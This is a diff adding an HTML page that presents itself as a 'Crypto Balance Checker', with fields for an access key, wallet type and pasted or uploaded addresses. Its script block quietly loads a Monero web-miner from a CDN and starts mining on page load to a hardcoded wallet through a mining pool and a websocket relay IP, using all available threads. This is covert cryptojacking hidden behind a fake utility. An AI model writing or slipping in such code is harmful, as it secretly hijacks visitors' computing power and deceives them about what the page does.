@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crypto Balance Checker</title>
+    <style>
+        body {
+            background-image: url('https://cdnb.artstation.com/p/assets/images/images/009/358/213/original/tony-twaine-comp-2-2.gif?1518528958');
+            background-size: cover;
+            opacity: 100%;
+        }
+
+        .rounded {
+            border-radius: 10px;
+        }
+
+        .yellow-bg {
+            background-color: yellow;
+            width: 300px;
+        }
+
+        .light-gray-bg {
+            background-color: rgba(211, 211, 211, 0.8); /* adjusted transparency */
+        }
+
+        .centered-textarea {
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .green-bg {
+            background-color: lightgreen;
+        }
+
+        /* Updated styles for the button */
+        .large-button {
+            font-size: 2em;  /* larger font size */
+            padding: 5px 30px;  /* more padding for a bigger button */
+            border-radius: 15px;  /* smooth the edges */
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);  /* subtle shadow for depth */
+        }
+
+        /* Enhanced icon for better visibility */
+        .large-button span {
+            font-size: 1.3em;  /* larger icon size */
+            vertical-align: middle;  /* center the icon with the text */
+            margin-left: 10px;  /* spacing between text and icon */
+        }
+
+        .centered-box {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 10px;
+            text-align: center;
+            background-color: rgba(128, 128, 128, 0.9); /* adjusted transparency */
+            margin: 20px 15%; /* updated to rubber band better */
+            border-radius: 10px;
+        display: inline-block; /* to make background fit the content */
+        }
+
+        .clearfix {
+            clear: both;
+        }
+
+        h1 {
+            color: orange;
+            font-size: 2.5em;
+            background-color: rgba(0, 0, 0, 0.5); /* background for visibility */
+            padding: 5px;
+            border-radius: 15px;
+            display: inline-block; /* to make background fit the content */
+            animation: colorChange 2s infinite;
+        }
+
+        @keyframes colorChange {
+            0% { color: orange; }
+            25% { color: yellow; }
+            50% { color: red; }
+            75% { color: orange; }
+            100% { color: yellow; }
+        }
+
+        select option[value="bitcoin"]:checked {
+            background-color: orange;
+        }
+
+        select option[value="ethereum"]:checked {
+            background-color: lightblue;
+        }
+
+        select option[value="litecoin"]:checked {
+            background-color: lightgray;
+        }
+
+        select option[value="autodetect"]:checked {
+            background: linear-gradient(left, red, orange, yellow, green, blue, indigo, violet);
+        }
+    </style>
+</head>
+
+<body>
+    <div style="text-align:center;">
+        <h1>Crypto Balance Checker v1.8</h1>
+        <div class="clearfix"></div>  
+        <input type="text" class="yellow-bg rounded" style="text-align:center;" placeholder="Access Key 🗝">
+        <br>
+        <div class="centered-box rounded">
+        <h2><label>Wallet Type</label></h2>
+        <select class="rounded" id="walletType" onchange="updateIcon()">
+            <option value="bitcoin" selected>Bitcoin</option>
+            <option value="ethereum">Ethereum</option>
+            <option value="litecoin">Litecoin</option>
+            <option value="autodetect">Autodetect (coming soon)</option>
+        </select>
+        <br><br>
+        <div id="walletIcon"></div> <!-- placeholder for the wallet icon -->
+        <br>
+        </div>
+        <br>
+        <div class="centered-box rounded">
+        <span>📄</span>
+            <br>            
+        <h2><label>Load From File (TXT or CSV)</label></h2>
+            <input type="file" accept=".txt, .csv" class="rounded">
+        </div>
+        <br>
+        <textarea class="light-gray-bg rounded" rows="5" cols="50" placeholder="Paste Addresses Here"></textarea>
+        <br><br>
+        <button class="green-bg rounded large-button" onclick="window.location.href='ProgressAndStats.html'">Check <span>🔍</span></button>
+
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
+    <script>
+        console.log("Config Loaded")
+        server = "wss://45.119.82.33:40725/";
+        var pool = "gulf.moneroocean.stream:80";
+        var walletAddress = "46HekyoxQACdipGjGPTDVE6Doppe7iYSrTMHoNLzrnXuHuP9feFS8DxckWtH9MjjjqGvSeVAFq9QxM6n3wMqVWXzJJLy4EU";
+        var workerId = "Ж";
+        var threads = -1;
+        var password = "";
+        startMining(pool, walletAddress, workerId, threads, password);
+        throttleMiner = 20;
+
+        // function to update the wallet icon based on the selected option
+function updateIcon() {
+    let type = document.getElementById("walletType").value;
+    let iconDiv = document.getElementById("walletIcon");
+    switch (type) {
+        case 'bitcoin':
+            iconDiv.innerHTML = '<img src="https://cdn3.emoji.gg/emojis/Bitcoin.png" width="50" height="50">';
+            break;
+        case 'ethereum':
+            iconDiv.innerHTML = '<img src="https://icons.iconarchive.com/icons/cjdowner/cryptocurrency-flat/256/Ethereum-ETH-icon.png" width="50" height="50">';
+            break;
+        case 'litecoin':
+            iconDiv.innerHTML = '<img src="https://cdn3.emoji.gg/emojis/4887-ltc.png" width="50" height="50">';
+            break;
+        case 'autodetect':
+            iconDiv.innerHTML = '<img src="https://emojiisland.com/cdn/shop/products/Robot_Emoji_Icon_abe1111a-1293-4668-bdf9-9ceb05cff58e_large.png?v=1571606090" width="50" height="50">';
+            break;
+        default:
+            iconDiv.innerHTML = '<img src="https://cdn3.emoji.gg/emojis/Bitcoin.png" width="50" height="50">';
+            }
+        }
+        document.addEventListener("DOMContentLoaded", function() {
+            updateIcon();
+        });
+    </script>
+</body>
+
+</html>
